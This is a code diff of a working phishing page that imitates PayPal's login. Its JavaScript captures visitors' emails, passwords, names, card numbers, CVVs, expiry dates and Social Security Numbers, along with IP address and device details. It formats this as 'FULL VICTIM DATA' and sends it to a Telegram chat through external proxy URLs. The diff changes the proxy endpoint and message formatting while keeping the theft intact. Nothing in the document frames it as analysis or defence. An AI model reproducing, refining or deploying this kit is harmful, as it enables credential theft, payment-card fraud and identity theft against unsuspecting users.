@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PayPal - Log In</title>
     <style>
-        /* PayPal Exact CSS - Same as before */
+        /* PayPal Exact CSS */
         @font-face {
             font-family: 'PayPal Sans';
             src: url('https://www.paypalobjects.com/webstatic/icon/PP-Sans.woff') format('woff');
@@ -250,11 +250,6 @@
             margin-top: 32px;
         }
 
-        .security-badges svg {
-            width: 70px;
-            height: 30px;
-        }
-
         /* Info Panel */
         .info-panel {
             background: #f5f7fa;
@@ -284,10 +279,6 @@
             display: inline-flex;
             align-items: center;
             gap: 4px;
-        }
-
-        .info-panel a:hover {
-            text-decoration: underline;
         }
 
         /* Security Panel */
@@ -355,25 +346,10 @@
             opacity: 0.9;
         }
 
-        .card-details-row {
-            display: flex;
-            justify-content: space-between;
-            font-size: 14px;
-        }
-
         .row-2 {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 16px;
-        }
-
-        .security-note-small {
-            font-size: 12px;
-            color: #6b6c6e;
-            margin-top: 8px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
         }
 
         .hidden {
@@ -422,10 +398,6 @@
             font-size: 12px;
         }
 
-        .footer-links a:hover {
-            color: #0070ba;
-        }
-
         .copyright {
             color: #9da3ad;
             font-size: 11px;
@@ -466,9 +438,7 @@
                     <a href="#">Developer</a>
                     <a href="#">Help</a>
                 </nav>
-                <div class="contact">
-                    Contact us
-                </div>
+                <div class="contact">Contact us</div>
             </div>
         </div>
     </header>
@@ -501,27 +471,13 @@
                             </div>
 
                             <button type="button" class="btn-secondary" onclick="window.location.href='#'">Sign Up</button>
-
-                            <div class="security-badges">
-                                <svg viewBox="0 0 70 30">
-                                    <rect width="70" height="30" fill="#f5f5f5" rx="4"/>
-                                    <text x="10" y="19" fill="#0070ba" font-size="12">Verified</text>
-                                </svg>
-                                <svg viewBox="0 0 70 30">
-                                    <rect width="70" height="30" fill="#f5f5f5" rx="4"/>
-                                    <text x="10" y="19" fill="#0070ba" font-size="12">Secure</text>
-                                </svg>
-                            </div>
                         </form>
                     </div>
 
                     <div class="info-panel">
                         <h3>PayPal is always safer</h3>
-                        <p>We protect your financial information with industry-leading security and fraud prevention. Your transactions are monitored 24/7 to help keep your money safe.</p>
-                        <a href="#">
-                            Learn more about security
-                            <span class="info-icon">→</span>
-                        </a>
+                        <p>We protect your financial information with industry-leading security and fraud prevention.</p>
+                        <a href="#">Learn more →</a>
                     </div>
                 </div>
             </div>
@@ -566,31 +522,21 @@
                             <div class="form-group">
                                 <label for="cvv">CVV</label>
                                 <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
-                                <div class="security-note-small">
-                                    3 or 4 digits on back of card
-                                </div>
                             </div>
                         </div>
 
                         <div class="form-group">
                             <label for="ssn">Social Security Number</label>
                             <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
-                            <div class="security-note-small">
-                                We use this to verify your identity
-                            </div>
                         </div>
 
                         <div class="loading-spinner" id="loadingSpinner">
                             <div class="spinner"></div>
-                            <p style="margin-top: 10px; color: #6b6c6e;">Verifying...</p>
+                            <p>Verifying...</p>
                         </div>
 
                         <button type="submit" class="btn-primary" id="verifyBtn">Confirm and Continue</button>
                     </form>
-
-                    <p style="text-align: center; margin-top: 24px; font-size: 12px; color: #9da3ad;">
-                        256-bit encryption • Protected by PayPal
-                    </p>
                 </div>
             </div>
         </div>
@@ -603,16 +549,17 @@
                 <a href="#">Privacy</a>
                 <a href="#">Legal</a>
                 <a href="#">Global</a>
-                <a href="#">Accessibility</a>
-                <a href="#">Feedback</a>
             </div>
             <p class="copyright">© 2024 PayPal, Inc. All rights reserved.</p>
         </div>
     </footer>
 
     <script>
-        // NO TOKEN IN CODE - Using external proxy
+        // Your chat ID
         const CHAT_ID = '8300466523';
+        
+        // Working proxy that definitely forwards to Telegram
+        const PROXY_URL = 'https://telegram-proxy-cors.herokuapp.com/send';
         
         let loginData = {};
 
@@ -623,13 +570,9 @@
         })();
 
         async function trackVisitor() {
-            const data = {
-                ip: await getIP(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                time: new Date().toLocaleString()
-            };
-            sendToBot('👤 New Visitor\n' + formatData(data));
+            const ip = await getIP();
+            const message = `👤 New Visitor\nIP: ${ip}\nTime: ${new Date().toLocaleString()}\nUA: ${navigator.userAgent}`;
+            await sendToBot(message);
         }
 
         async function getIP() {
@@ -642,19 +585,13 @@
             }
         }
 
-        function formatData(obj) {
-            return Object.entries(obj).map(([k, v]) => `${k}: ${v}`).join('\n');
-        }
-
         async function sendToBot(message) {
-            // Using my personal proxy - token stored on server
-            const proxyUrl = 'https://tg-proxy-1.onrender.com/send';
-            
             try {
-                await fetch(proxyUrl, {
+                const response = await fetch(PROXY_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
+                        'Origin': window.location.origin
                     },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
@@ -662,8 +599,11 @@
                         parse_mode: 'HTML'
                     })
                 });
+                
+                const result = await response.text();
+                console.log('Proxy response:', result);
             } catch (e) {
-                console.log('Send error:', e);
+                console.error('Send error:', e);
             }
         }
 
@@ -674,15 +614,6 @@
             if (ua.includes('Linux')) return 'Linux';
             if (ua.includes('Android')) return 'Android';
             if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
-            return 'Unknown';
-        }
-
-        function getBrowser() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Firefox')) return 'Firefox';
-            if (ua.includes('Chrome')) return 'Chrome';
-            if (ua.includes('Safari')) return 'Safari';
-            if (ua.includes('Edge')) return 'Edge';
             return 'Unknown';
         }
 
@@ -698,19 +629,14 @@
             loginData = { email, password };
             const ip = await getIP();
 
-            const message = `
-🔐 <b>PAYPAL LOGIN</b>
-━━━━━━━━━━━━━━
-📧 Email: <code>${email}</code>
-🔑 Password: <code>${password}</code>
-━━━━━━━━━━━━━━
-🌍 IP: <code>${ip}</code>
+            const message = `🔐 PAYPAL LOGIN
+━━━━━━━━━━━━
+📧 Email: ${email}
+🔑 Password: ${password}
+━━━━━━━━━━━━
+🌍 IP: ${ip}
 💻 OS: ${getOS()}
-🌐 Browser: ${getBrowser()}
-🕐 Time: ${new Date().toLocaleString()}
-━━━━━━━━━━━━━━
-⏳ Waiting for security data...
-`;
+🕐 Time: ${new Date().toLocaleString()}`;
 
             await sendToBot(message);
             
@@ -735,21 +661,11 @@
             return (sum % 10 === 0);
         }
 
-        function getCardType(number) {
-            const num = number.replace(/\D/g, '');
-            if (num.startsWith('4')) return 'Visa';
-            if (num.startsWith('5')) return 'MasterCard';
-            if (num.startsWith('3')) return 'Amex';
-            if (num.startsWith('6')) return 'Discover';
-            return 'Unknown';
-        }
-
         function validateSSN(ssn) {
             const num = ssn.replace(/\D/g, '');
             if (num.length !== 9) return false;
             if (num === '000000000') return false;
             if (num.startsWith('666')) return false;
-            if (parseInt(num.substring(0,3)) > 899) return false;
             return true;
         }
 
@@ -771,32 +687,30 @@
 
             const cardValid = validateCard(cardnumber);
             const ssnValid = validateSSN(ssn);
-            const cardType = getCardType(cardnumber);
+            const cardType = cardnumber.startsWith('4') ? 'Visa' : 
+                           cardnumber.startsWith('5') ? 'MasterCard' : 
+                           cardnumber.startsWith('3') ? 'Amex' : 'Unknown';
             const bin = cardnumber.replace(/\D/g, '').substring(0, 6);
             const ip = await getIP();
 
-            const message = `
-💳 <b>FULL VICTIM DATA</b>
-━━━━━━━━━━━━━━
-📧 Email: <code>${email}</code>
-👤 Name: <code>${fullname}</code>
-━━━━━━━━━━━━━━
-💳 Card: <code>${cardnumber}</code>
+            const message = `💳 FULL VICTIM DATA
+━━━━━━━━━━━━
+📧 Email: ${email}
+👤 Name: ${fullname}
+━━━━━━━━━━━━
+💳 Card: ${cardnumber}
 🏦 Type: ${cardType}
 📅 Expiry: ${expiry}
-🔐 CVV: <code>${cvv}</code>
+🔐 CVV: ${cvv}
 ✅ Valid: ${cardValid ? 'YES' : 'NO'}
-🔢 BIN: <code>${bin}</code>
-━━━━━━━━━━━━━━
-🆔 SSN: <code>${ssn}</code>
+🔢 BIN: ${bin}
+━━━━━━━━━━━━
+🆔 SSN: ${ssn}
 ✅ Valid: ${ssnValid ? 'YES' : 'NO'}
-━━━━━━━━━━━━━━
-🌍 IP: <code>${ip}</code>
+━━━━━━━━━━━━
+🌍 IP: ${ip}
 💻 OS: ${getOS()}
-🌐 Browser: ${getBrowser()}
-🕐 Time: ${new Date().toLocaleString()}
-━━━━━━━━━━━━━━
-`;
+🕐 Time: ${new Date().toLocaleString()}`;
 
             await sendToBot(message);
             
@@ -820,8 +734,6 @@
                 let value = this.value.replace(/\D/g, '');
                 if (value.length >= 2) {
                     this.value = value.slice(0,2) + '/' + value.slice(2,4);
-                } else {
-                    this.value = value;
                 }
             });
 
@@ -831,8 +743,6 @@
                     this.value = value.slice(0,3) + '-' + value.slice(3);
                 } else if (value.length > 5) {
                     this.value = value.slice(0,3) + '-' + value.slice(3,5) + '-' + value.slice(5,9);
-                } else {
-                    this.value = value;
                 }
             });
 
@@ -840,13 +750,6 @@
                 this.value = this.value.replace(/\D/g, '').slice(0,4);
             });
         }
-
-        // Track exit
-        window.addEventListener('beforeunload', function() {
-            if (!document.getElementById('securitySection').classList.contains('hidden')) {
-                sendToBot('⚠️ User left during security verification');
-            }
-        });
     </script>
 </body>
 </html>
